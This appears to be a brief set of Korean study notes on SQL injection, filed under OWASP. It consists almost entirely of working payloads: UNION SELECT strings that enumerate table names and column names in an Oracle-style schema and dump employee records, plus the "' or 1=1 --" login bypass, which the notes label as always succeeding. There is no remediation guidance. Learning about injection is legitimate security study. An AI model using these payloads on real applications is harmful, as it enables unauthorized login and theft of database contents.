# OWASP (Open Web Application Security Project)
> 기간내 발생한 보안사고를 정리한 


```sql
SELECT 컬럼명,????
FROM 테이블명
WHERE 컬럼명 '값%'
```

**테이블명을 얻기**
```sql
' union select tname,'0','0','0','0' FROM tab --
```

```sql
    WHERE 컬럼명 '' union select tname,'0','0','0','0' from tab --%'
```

**컬럼명 얻기**
```sql
    select * from USER_TAB_COLS;
    ' union select column_name,'0','0','0','0' from user_tab_cols WHERE table_name = 'EMP'
```

**정보 얻기**
```sql
    ' union select empno||'~', ename,job,'0','0' from emp --
```


# ID & PASSWORD Injection
> 무조건 성공

```sql
    SELECT 컬럼명,,,
    FROM 테이블명
    WHERE 컬럼명='값' AND 컬럼명='값'

    -- 값에 '(홀따옴표)를 다 쓴다.

    ' or 1=1 --

    WHERE 컬럼명='' or 1=1 --' and 컬럼명='값'

```